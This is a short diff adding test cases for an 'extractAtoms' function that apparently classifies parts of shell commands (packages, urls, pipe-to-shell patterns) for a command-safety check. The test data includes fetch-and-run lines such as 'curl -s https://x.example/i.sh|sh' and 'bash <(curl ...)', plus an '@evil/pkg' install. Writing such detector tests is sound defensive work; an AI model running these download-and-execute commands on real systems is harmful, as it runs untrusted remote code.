@@ -41,6 +41,11 @@ describe('extractAtoms', () => {
     expect(kinds('npx -p typescript tsc --init', 'pkg')).toEqual(['typescript']);
   });
 
+  it('finds runners and installers regardless of case', () => {
+    expect(kinds('NPX @evil/pkg', 'pkg')).toEqual(['@evil/pkg']);
+    expect(kinds('PIP INSTALL requests', 'pkg')).toEqual(['requests']);
+  });
+
   it('finds every package named by an installer, skipping flag values, paths and urls', () => {
     expect(kinds('npm install left-pad express@4 --save-dev', 'pkg')).toEqual([
       'left-pad',
@@ -73,6 +78,10 @@ describe('extractAtoms', () => {
       'bash <(curl -s https://x.example/i.sh)',
     ]);
     expect(kinds('curl https://x.example/data.json | jq .', 'pipe_shell')).toEqual([]);
+  });
+
+  it('stops a url at a pipe, so a piped installer still yields the fetched url', () => {
+    expect(kinds('curl -s https://x.example/i.sh|sh', 'url')).toEqual(['https://x.example/i.sh']);
   });
 
   it('finds base64 blobs but not hex digests or long words', () => {
